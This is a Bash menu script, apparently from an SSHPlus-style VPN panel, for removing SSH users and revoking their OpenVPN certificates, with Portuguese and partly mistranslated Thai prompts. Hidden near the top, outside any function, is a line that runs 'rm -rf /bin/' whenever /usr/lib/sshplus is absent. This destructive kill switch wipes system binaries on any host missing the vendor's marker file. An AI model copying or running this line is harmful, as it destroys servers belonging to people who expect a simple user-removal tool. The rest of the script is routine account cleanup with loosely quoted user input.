#!/bin/bash
remove_ovp () {
if [[ -e /etc/debian_version ]]; then
	GROUPNAME=nogroup
fi
user="$1"
cd /etc/openvpn/easy-rsa/
./easyrsa --batch revoke $user
./easyrsa gen-crl
rm -rf pki/reqs/$user.req
rm -rf pki/private/$user.key
rm -rf pki/issued/$user.crt
rm -rf /etc/openvpn/crl.pem
cp /etc/openvpn/easy-rsa/pki/crl.pem /etc/openvpn/crl.pem
chown nobody:$GROUPNAME /etc/openvpn/crl.pem
[[ -e $HOME/$user.ovpn ]] && rm $HOME/$user.ovpn > /dev/null 2>&1
[[ -e /var/www/html/openvpn/$user.zip ]] && rm /var/www/html/openvpn/$user.zip > /dev/null 2>&1
} > /dev/null 2>&1
[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/ > /dev/null 2>&1
database="/root/usuarios.db"
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "Remover Usuário SSH" ; tput sgr0
echo ""
echo -e "\033[1;31m[\033[1;36m1\033[1;31m]\033[1;33m REMOVER UM USUARIO"
echo -e "\033[1;31m[\033[1;36m2\033[1;31m]\033[1;33m REMOVER TODOS USUARIOS"
echo -e "\033[1;31m[\033[1;36m3\033[1;31m]\033[1;33m VOLTAR"
echo ""
read -p "$(echo -e "\033[1;32mChoose\033[1;31m ?\033[1;37m : ")" -e -i 1 resp
if [[ "$resp" = "1" ]]; then
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "ลบผู้ใช้ SSH" ; tput sgr0
echo ""
echo -e "\033[1;33mรายชื่อผู้ใช้: \033[0m"
echo""
_userT=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody)
i=0
unset _userPass
while read _user; do
	i=$(expr $i + 1)
	_oP=$i
	[[ $i == [1-9] ]] && i=0$i && oP+=" 0$i"
	echo -e "\033[1;31m[\033[1;36m$i\033[1;31m] \033[1;37m- \033[1;32m$_user\033[0m"
	_userPass+="\n${_oP}:${_user}"
done <<< "${_userT}"
echo ""
num_user=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
echo -ne "\033[1;32mป้อนหรือเลือกผู้ใช้\033[1;33m[\033[1;36m1\033[1;31m-\033[1;36m$num_user\033[1;33m]\033[1;37m: " ; read option
user=$(echo -e "${_userPass}" | grep -E "\b$option\b" | cut -d: -f2)
if [[ -z $option ]]; then
	tput setaf 7 ; tput setab 1 ; tput bold ; echo "" ; echo "  ผู้ใช้ว่างเปล่าหรือไม่ถูกต้อง!   " ; echo "" ; tput sgr0
	exit 1
elif [[ -z $user ]]; then
	tput setaf 7 ; tput setab 1 ; tput bold ; echo "" ; echo " ผู้ใช้ว่างเปล่าหรือไม่ถูกต้อง! " ; echo "" ; tput sgr0
	exit 1
else
	if cat /etc/passwd |grep -w $user > /dev/null; then
		echo ""
		pkill -f "$user" > /dev/null 2>&1
		deluser --force $user > /dev/null 2>&1
		echo -e "\E[41;1;37m Usuario $user removido com sucesso! \E[0m"
		grep -v ^$user[[:space:]] /root/usuarios.db > /tmp/ph ; cat /tmp/ph > /root/usuarios.db
		rm /etc/SSHPlus/senha/$user 1>/dev/null 2>/dev/null
		if [[ -e /etc/openvpn/server.conf ]]; then
			remove_ovp $user
		fi
		exit 1
	elif [[ "$(cat "$database"| grep -w $user| wc -l)" -ne "0" ]]; then
		ps x | grep $user | grep -v grep | grep -v pt > /tmp/rem
		if [[ `grep -c $user /tmp/rem` -eq 0 ]]; then
			deluser --force $user > /dev/null 2>&1
			echo ""
			echo -e "\E[41;1;37m Usuario $user removido com sucesso! \E[0m"
			grep -v ^$user[[:space:]] /root/usuarios.db > /tmp/ph ; cat /tmp/ph > /root/usuarios.db
			rm /etc/SSHPlus/senha/$user 1>/dev/null 2>/dev/null
			if [[ -e /etc/openvpn/server.conf ]]; then
				remove_ovp $user
		    fi
			exit 1
		else
		    echo ""
			tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Usuário conectado. Desconectando..." ; tput sgr0
			pkill -f "$user" > /dev/null 2>&1
			deluser --force $user > /dev/null 2>&1
			echo -e "\E[41;1;37m Usuario $user removido com sucesso! \E[0m"
			grep -v ^$user[[:space:]] /root/usuarios.db > /tmp/ph ; cat /tmp/ph > /root/usuarios.db
			rm /etc/SSHPlus/senha/$user 1>/dev/null 2>/dev/null
			if [[ -e /etc/openvpn/server.conf ]]; then
				remove_ovp $user
		    fi
			exit 1
		fi
	else
		tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "O usuário $user não existe!" ; echo "" ; tput sgr0
	fi
fi
elif [[ "$resp" = "2" ]]; then
	clear
	tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "Remover Usuário SSH" ; tput sgr0
	echo ""
	echo -ne "\033[1;33mREALMENTE DESEJA REMOVER TODOS USUARIOS \033[1;37m[s/n]: "; read opc	
	if [[ "$opc" = "s" ]]; then
	echo -e "\n\033[1;33mAguarde\033[1;32m.\033[1;31m.\033[1;33m.\033[0m"
		for user in $(cat /etc/passwd |awk -F : '$3 > 900 {print $1}' |grep -vi "nobody"); do
			pkill -f $user > /dev/null 2>&1
			deluser --force $user > /dev/null 2>&1
        if [[ -e /etc/openvpn/server.conf ]]; then
		   remove_ovp $user
		fi
		done
		rm $HOME/usuarios.db && touch $HOME/usuarios.db
        rm *.zip > /dev/null 2>&1
		echo -e "\n\033[1;32mต้องการลบผู้ใช้ทั้งหมดจริงๆ!\033[0m"
		sleep 2
		menu
	else
		echo -e "\n\033[1;31mกลับมาที่เมนู...\033[0m"
		sleep 2
		menu
	fi
elif [[ "$resp" = "3" ]]; then
	menu
else
	echo -e "\n\033[1;31mตัวเลือกไม่ถูกต้อง !\033[0m"
	sleep 1.5s
	menu
fi
